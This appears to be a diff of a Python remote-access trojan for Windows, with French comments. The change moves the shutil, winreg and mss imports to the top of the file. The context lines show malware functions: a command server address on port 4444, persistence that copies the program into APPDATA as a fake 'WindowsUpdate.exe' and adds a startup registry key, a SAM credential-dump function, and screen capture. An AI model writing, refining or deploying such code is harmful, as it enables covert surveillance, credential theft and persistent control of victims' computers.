@@ -4,6 +4,9 @@ import os
 import sys
 import base64
 import time
+import shutil
+import winreg
+import mss
 
 SERVER_IP = "192.168.1.100"
 SERVER_PORT = 4444
@@ -87,9 +90,6 @@ def main():
 # se copie dans appdata et s'ajoute au demarrage de windows
 def setup_persistence():
     try:
-        import shutil
-        import winreg
-
         dest = os.path.join(os.environ["APPDATA"], "WindowsUpdate.exe")
         if not os.path.exists(dest):
             shutil.copy2(sys.argv[0], dest)
@@ -109,7 +109,6 @@ def setup_persistence():
 # ajoute une clef dans le registre windows
 def add_registry_key(chemin, nom, valeur):
     try:
-        import winreg
         clef = winreg.OpenKey(winreg.HKEY_CURRENT_USER, chemin, 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(clef, nom, 0, winreg.REG_SZ, valeur)
         winreg.CloseKey(clef)
@@ -144,7 +143,6 @@ def dump_sam():
 # prend un screenshot et renvoie les bytes png bruts
 def take_screenshot():
     try:
-        import mss
         with mss.mss() as sct:
             img = sct.grab(sct.monitors[1])
             return mss.tools.to_png(img.rgb, img.size)
